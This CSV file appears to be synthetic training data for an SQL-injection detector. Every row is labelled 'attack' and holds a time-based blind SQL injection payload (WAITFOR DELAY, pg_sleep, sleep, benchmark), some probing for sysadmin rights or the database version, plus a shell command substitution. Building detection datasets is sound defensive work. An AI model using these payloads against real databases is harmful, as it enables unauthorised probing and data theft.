id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000690,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.11474323350463782
SMOTE_000691,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.005820168956206318
SMOTE_000692,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.173342343043334
SMOTE_000693,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.5633166687337895
SMOTE_000694,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.394811407315114
SMOTE_000695,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.59637616437012
SMOTE_000696,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.10528031962925215
SMOTE_000697,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.8396353831070437
SMOTE_000698,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.4378886193360274
SMOTE_000699,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.11845940504750613
SMOTE_000700,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.48108234098425584
SMOTE_000701,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.46749073522137147
SMOTE_000702,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.09356143759207078
SMOTE_000703,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.3566589012211367
SMOTE_000704,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.60033304171299
SMOTE_000705,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.928158632038111
SMOTE_000706,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,2.026196327517033
SMOTE_000707,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.959536623827013
SMOTE_000708,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.5442252020206824
SMOTE_000709,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.3683896377165812
SMOTE_000710,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.4280903987332119
SMOTE_000711,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.932985395091923
SMOTE_000712,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.21752477493068204
SMOTE_000713,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.4173773730975428
SMOTE_000714,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.09513298591783387
SMOTE_000715,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.36642559390864476
SMOTE_000716,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.8974941083169043
SMOTE_000717,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,1.0482544691248732
SMOTE_000718,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.6974580825220364
SMOTE_000719,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.2629412627545106
SMOTE_000720,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.13186203202846075
SMOTE_000721,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.7176504546997414
SMOTE_000722,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.23710753785985383
SMOTE_000723,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.239255590415659
SMOTE_000724,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,2.092721504531581
SMOTE_000725,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.5374759457739797
SMOTE_000726,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.3170777283212588
SMOTE_000727,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.7221469124667858
SMOTE_000728,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.36853823228441057
SMOTE_000729,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.35474533955775783
SMOTE_000730,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.3133609346808912
SMOTE_000731,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.9239306106043957
SMOTE_000732,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.2034173388098799
SMOTE_000733,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.1251219975499707
SMOTE_000734,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,2.454805752291082
SMOTE_000735,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.006332857502991593
SMOTE_000736,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.05127383188338975
SMOTE_000737,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.162983038133225
SMOTE_000738,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6341900997631987
SMOTE_000739,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.6932165365738241
SMOTE_000740,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.11059092541608215
SMOTE_000741,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.4802918484695941
SMOTE_000742,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.3918190870807194
SMOTE_000743,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.5053635232370324
SMOTE_000744,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.5407316528695597
SMOTE_000745,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.13083130611149296
SMOTE_000746,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.5081533403869355
SMOTE_000747,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.8269697470285557
SMOTE_000748,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.6639621712755109
SMOTE_000749,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.006620688502283028
SMOTE_000750,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5450642790575079
SMOTE_000751,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.6921638397064803
SMOTE_000752,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.153564708034563
SMOTE_000753,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,4.211414043016651
SMOTE_000754,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.3082841343104918
SMOTE_000755,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.441781126619028
SMOTE_000756,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.7625254302174866
SMOTE_000757,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.33271378519930955
SMOTE_000758,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.27611972923186373
SMOTE_000759,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.862437155888712
SMOTE_000760,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.029110313093792355
SMOTE_000761,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.007276491691787121
SMOTE_000762,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,2.280350710638262
SMOTE_000763,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.410014260599777
SMOTE_000764,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.4189698573476104
SMOTE_000765,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.537438851218894
SMOTE_000766,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.215276725837592
SMOTE_000767,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.5502247516549171
SMOTE_000768,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.6140904222281376
SMOTE_000769,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.2600708768197191
SMOTE_000770,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,2.575066243554012
SMOTE_000771,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.9108327314543596
SMOTE_000772,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.5416846343962587
SMOTE_000773,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.2436708271912136
SMOTE_000774,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.9455562789747746
SMOTE_000775,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.4070358281627733
SMOTE_000776,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.8885326863164573
SMOTE_000777,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.914392678958988
SMOTE_000778,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.04425014538649923
SMOTE_000779,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.5402791218564484
SMOTE_000780,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.01413472593197341
SMOTE_000781,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.242111156800762
SMOTE_000782,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.2416106528470183
SMOTE_000783,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.882100563160821
SMOTE_000784,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.9564353886448885
SMOTE_000785,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.15383749147490544
SMOTE_000786,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.6207193878084902
SMOTE_000787,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.28552500615259857
SMOTE_000788,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,2.0475464081152395
SMOTE_000789,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.8037167928392641
SMOTE_000790,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.3409068160225734
SMOTE_000791,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.6331106567648367
SMOTE_000792,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.002160645394367493
SMOTE_000793,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.7954973296478285
SMOTE_000794,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,2.3127865109422654
SMOTE_000795,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.9132331985220923
SMOTE_000796,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.2887137572014995
SMOTE_000797,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.037818323260749
SMOTE_000798,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.980952245460453
SMOTE_000799,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.6527443216834842
SMOTE_000800,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.521001810643012
SMOTE_000801,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.4001590998750417
SMOTE_000802,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.7197769574395787
SMOTE_000803,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.0370863010978431
SMOTE_000804,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.22372096161905744
SMOTE_000805,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.928045340060617
SMOTE_000806,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.013151563612182284
SMOTE_000807,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.9804802944206983
SMOTE_000808,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.672353316454619
SMOTE_000809,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.40420908184475574
SMOTE_000810,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.6316274158015033
SMOTE_000811,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.006863338845529251
SMOTE_000812,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.7653953737716457
SMOTE_000813,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.6070232798553304
SMOTE_000814,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.26342803746333654
SMOTE_000815,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.8575550995594474
SMOTE_000816,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.2370162095082315
SMOTE_000817,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.15413858355313215
SMOTE_000818,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.37790373590930154
SMOTE_000819,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.1165052159505739
SMOTE_000820,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0025512585676881827
SMOTE_000821,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.048549519779617384
SMOTE_000822,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.32325822977243884
SMOTE_000823,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.36267308833499473
SMOTE_000824,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.0908353835746665
SMOTE_000825,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,2.964708064889585
SMOTE_000826,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.6183683268148511
SMOTE_000827,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.5824068346944479
SMOTE_000828,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.00116484524938
SMOTE_000829,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.40992029226514975
SMOTE_000830,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.4618429881066307
SMOTE_000831,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.047676131578149
SMOTE_000832,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.1917075337173653
SMOTE_000833,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.8657874129153809
SMOTE_000834,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.31521881455188183
SMOTE_000835,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,3.0662201205089765
